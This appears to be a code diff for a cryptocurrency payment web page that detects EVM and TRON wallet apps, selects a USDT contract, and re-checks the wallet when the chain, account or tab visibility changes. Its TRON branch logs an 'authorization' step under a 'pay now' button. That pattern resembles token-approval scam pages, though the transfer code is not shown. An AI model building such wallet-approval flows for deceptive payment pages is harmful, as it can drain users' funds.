@@ -113,12 +113,14 @@
 
       let payHandler = null;
       let chainType = "unknown";
+      let refreshing = false;
 
       async function checkEnv() {
         const cfg = window.pay0Config || {};
         const okxTronLink = window.okxwallet && window.okxwallet.tronLink ? window.okxwallet.tronLink : null;
         const tronWebCandidate = window.tronWeb || (okxTronLink && okxTronLink.tronWeb ? okxTronLink.tronWeb : null);
         const tronAddr = tronWebCandidate && tronWebCandidate.defaultAddress ? tronWebCandidate.defaultAddress.base58 : null;
+        const tronReady = !!(tronAddr || (okxTronLink && okxTronLink.ready) || (window.tronLink && window.tronLink.ready));
 
         function updateUsdtContractAddress(chainKey) {
           let tokenAddress = "";
@@ -163,6 +165,17 @@
           } catch (e) { }
         }
 
+        if (tronReady && okxTronLink && okxTronLink.ready) {
+          chainType = "tron";
+          $("netText").textContent = "TRON 网络";
+          updateUsdtContractAddress("tron");
+          return async () => {
+            log("正在发起 TRON 授权...");
+            const amount = (cfg.amountUsdt || "0.00").toString();
+            await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
+          };
+        }
+
         if (evm && evm.foundKey && evm.hasAccount) {
           chainType = "evm";
           $("netText").textContent = evm.label;
@@ -175,7 +188,7 @@
           };
         }
 
-        if (tronAddr) {
+        if (tronReady) {
           chainType = "tron";
           $("netText").textContent = "TRON 网络";
           updateUsdtContractAddress("tron");
@@ -211,10 +224,12 @@
         return null;
       }
 
-      async function init() {
+      async function refreshEnv() {
+        if (refreshing) return;
+        refreshing = true;
         try {
-          await new Promise((r) => setTimeout(r, 500));
-          payHandler = await checkEnv();
+          const handler = await checkEnv();
+          payHandler = handler;
 
           if (payHandler) {
             btn.textContent = "立即支付";
@@ -241,13 +256,36 @@
 
             log("环境已就绪，请点击按钮进行支付");
           } else {
-            btn.textContent = "未检测到钱包环境";
-            btn.disabled = true;
-            btn.classList.remove("btn-primary");
-            btn.classList.add("btn-secondary");
-            $("netText").textContent = "非钱包环境";
-            log("请在钱包 APP 中打开此链接");
+            if (!btn.disabled) {
+              btn.textContent = "未检测到钱包环境";
+              btn.disabled = true;
+              btn.classList.remove("btn-primary");
+              btn.classList.add("btn-secondary");
+              $("netText").textContent = "非钱包环境";
+              log("请在钱包 APP 中打开此链接");
+            }
           }
+        } catch (e) {
+          log("初始化错误: " + e.message);
+        } finally {
+          refreshing = false;
+        }
+      }
+
+      async function init() {
+        try {
+          await new Promise((r) => setTimeout(r, 500));
+          await refreshEnv();
+
+          if (window.ethereum && typeof window.ethereum.on === "function") {
+            try {
+              window.ethereum.on("chainChanged", () => refreshEnv());
+              window.ethereum.on("accountsChanged", () => refreshEnv());
+            } catch (e) {}
+          }
+          document.addEventListener("visibilitychange", () => {
+            if (!document.hidden) refreshEnv();
+          });
         } catch (e) {
           log("初始化错误: " + e.message);
         }
